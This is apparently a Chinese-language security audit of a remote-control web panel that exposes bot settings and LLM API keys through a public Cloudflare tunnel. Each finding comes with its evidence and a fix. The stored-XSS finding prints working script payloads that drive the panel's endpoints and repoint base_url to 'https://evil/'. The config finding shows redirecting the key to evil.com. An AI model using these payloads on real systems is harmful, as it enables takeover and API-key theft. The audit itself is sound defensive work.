## 模块概述

`server.py` 是一个 Windows 上运行的 http.server (端口 18888, bind 0.0.0.0)，启动时自动拉起 Cloudflare Tunnel 把本地控制面板暴露到公网 `https://xxxx.trycloudflare.com`。面板功能：查看/修改 AI provider 配置（model/baseUrl/apiKey，写到 `E:\openclaw\.openclaw\clawdbot.json`）、增删预设（presets.json）、重启 Bot（taskkill 浏览器/终端 + 启动 startup.bat）。鉴权：单一 PIN 码（默认 "1234"，硬编码）。

## 攻击面定性

**这是一个把"Bot 配置（含真实 LLM apiKey）+ 系统重启能力"通过 Cloudflare 公网隧道暴露给互联网的远程控制面板，唯一鉴权是硬编码 4 位 PIN "1234" 且无任何速率限制。** 攻击者只要发现/扫描到隧道 URL（trycloudflare 域名可被枚举/旁路嗅探），即可：无鉴权读取 live apiKey（GET / 直接回显）、4 位 PIN 暴力（10000 空间，秒级）、改 baseUrl 把 bot 流量（含 Bearer apiKey）导向自身、注入恶意预设（存储型 XSS 命中 owner 浏览器）、远程重启系统。

  两 key 与 audit-2026-07-05-015 (api额度监测 APIMON-SECRET-01) **同一 provider yunyi.cfd**，但 key 值不同 → 独立 key 集。x-tool origin = 外部 fork r-ayin/x-tool，已 push 远端 → key 已脱离本机。

- **remediation**: (1) `.gitignore` 加 `一件重启脚本/remote_control/presets.json` 规则；(2) `git rm --cached` 该文件；(3) 新增 `presets.example.json` 模板（用占位 key）；(4) **owner 动作（不可由引擎代劳）**：到 yunyi.cfd 轮换 `AH7ZKSSM-...` 与 `K33EP67S-...` 两 key，并视情 `git filter-repo` 清历史。
- **kind**: route-fix（1-2 文件：.gitignore + presets.json，git rm --cached）

### RC-SEC-02 — HIGH — GET / 无鉴权，HTML 直接回显 live apiKey（value 属性）
- **file**: `remote_control/server.py:171-470`（ esp. 444-452）
- **evidence**: `do_GET` 处理 `/` 全程无 PIN 校验，直接从 `clawdbot.json` 读 `apiKey` 填入 `<input type="password" id="api_key" value="{api_key}">`（line 452）。`type="password"` 仅浏览器遮罩，`curl https://xxx.trycloudflare.com/` 返回 HTML 含明文 `value="AH7ZKSSM-..."`。
- **impact**: 任何拿到隧道 URL 的人一次 GET 即得 live apiKey —— 比 RC-SEC-01 更直接的泄漏通道（无需 git 访问）。
- **remediation**: 不在初始 HTML 嵌入 apiKey/primary_model/base_url。GET / 只返回 PIN 输入框 + 静态外壳；用户 POST PIN 校验通过后返回配置（或返回 mask 过的占位）。最小改动：把 444/448/452 的 `value="{...}"` 改成空串/占位，配置只在 PIN 校验后的端点返回。
- **kind**: route-fix（1 文件：server.py）

### RC-SEC-03 — HIGH — 硬编码弱 PIN "1234" + 自动公网隧道 + 无速率限制/锁定
- **file**: `remote_control/server.py:26`（`PIN_CODE = "1234"`）+ `:84-129`（start_tunnel_thread 自动暴露公网）+ `:714`（`print(f"Default PIN: {PIN_CODE}")`）+ 全部 PIN 校验点（475/499/546/584）无 attempt 计数
- **evidence**: PIN="1234"（4 位数字，10000 空间），ThreadingTCPServer 无中间件计数失败次数，Cloudflare Tunnel 自动把 0.0.0.0:18888 暴露到 `*.trycloudflare.com`。`/restart` `/update_config` `/add_preset` `/delete_preset` 每次 PIN 校验独立、无累计锁定。
- **impact**: 公网攻击者 10000 次 PIN 猜测即可拿下控制台（按 ~100 req/s 算约 100 秒，无锁定无告警）。拿下后可改 baseUrl 盗 apiKey（见 RC-CFG-01）、远程重启系统、注入 XSS。
- **remediation**: (1) PIN 从环境变量/外部文件读，不再硬编码 "1234"（启动时若未设置则拒绝启动或强制随机生成并打印一次）；(2) 加 per-IP 失败计数器：5 次失败锁 60s（内存 dict 即可，ThreadingTCPServer 已多线程）。最小版本：env 读 PIN + ip→fail_count dict + 锁定。
- **kind**: route-fix（1 文件：server.py）

### RC-XSS-01 — HIGH — 存储型 XSS：preset name 原样拼进 HTML
- **file**: `remote_control/server.py:203-211`
- **evidence**:
  ```python
  safe_json = json.dumps(p).replace('"', '&quot;')   # 仅 onclick 属性转义
  presets_html += f"""...<span class="preset-name">{p['name']}</span>..."""  # name 未转义！
  ```
  `/add_preset` 接受任意 `name`（PIN 校验后，但 PIN="1234" 公网可猜）。`p['name']` 直接进 `<span>`，无 html.escape。攻击者设 `name="<img src=x onerror=fetch('/restart?pin=1234')>"` 或 `<script>fetch('/update_config',{method:POST,body:JSON.stringify({pin:'1234',base_url:'https://evil/',api_key:'x'})})</script>` → owner 下次打开面板即触发，可自动改 baseUrl 盗 apiKey 或远程重启。
- **impact**: 持久化、命中 owner 浏览器（同源有 PIN 输入框），可驱动全部 PIN 保护端点。
- **remediation**: `import html; ... <span class="preset-name">{html.escape(p['name'])}</span>`。同时 `safe_json` 改用 `html.escape(json.dumps(p))` 更稳。1 文件 1 行。
- **kind**: route-fix（1 文件：server.py）

### RC-CFG-01 — MEDIUM — /update_config 可设任意 base_url → apiKey 经 Bearer 外发到攻击者主机（SSRF 类凭证盗取）
- **file**: `remote_control/server.py:510-525`
- **evidence**: `new_base_url = data.get('base_url')` 无 scheme/host 校验，直接写 `config['models']['providers'][provider_name]['baseUrl'] = new_base_url`。Bot 下次调 LLM 时把 `Authorization: Bearer <apiKey>` 发到攻击者控制的 base_url。
- **impact**: 攻击者拿下 PIN（RC-SEC-03）后改 base_url=`https://evil.com/claude`，bot 即把 live apiKey 送出。
- **remediation**: `validate_base_url(new_base_url)`：scheme 必须 https（本地 ollama 例外 http+localhost）、拒私网/环回/云元数据主机（同 audit-015 APIMON-SSRF-01 的 `_is_blocked_host`）。1 文件。
- **kind**: route-fix（1 文件：server.py）

### RC-BUG-01 — MEDIUM — `str(e, sort_keys=True)` 非法 Python，error 响应路径自崩
- **file**: `remote_control/server.py:539`
- **evidence**:
  ```python
  except Exception as e:
      ...
      self.wfile.write(json.dumps({"success": False, "message": str(e, sort_keys=True)}).encode('utf-8'))
  ```
  内置 `str()` 签名 `str(object='')` / `str(bytes, encoding, errors)`，**无 `sort_keys` 形参** → `str(e, sort_keys=True)` 抛 `TypeError: 'sort_keys' is an invalid keyword argument for str()`。即：当 save_config 失败（line 533 `raise Exception("Failed to write file")`）进入此 except 时，本欲返回的 JSON 错误响应自身崩溃，客户端收到连接断开而非 `{"success":false}`。作者显然把 `json.dumps(e, sort_keys=True)` 与 `str(e)` 混淆。
- **impact**: 配置保存失败时前端 fetch 无响应（catch 分支 `alert('请求错误')`），owner 无法诊断；同时掩盖真实错误。
- **remediation**: `str(e)`（去 sort_keys）。1 行。
- **kind**: route-fix（1 文件：server.py）—— **真逻辑 bug，命中自指 churn 例外（须 audit_findings 写明 file:line + 证据，本条满足）**
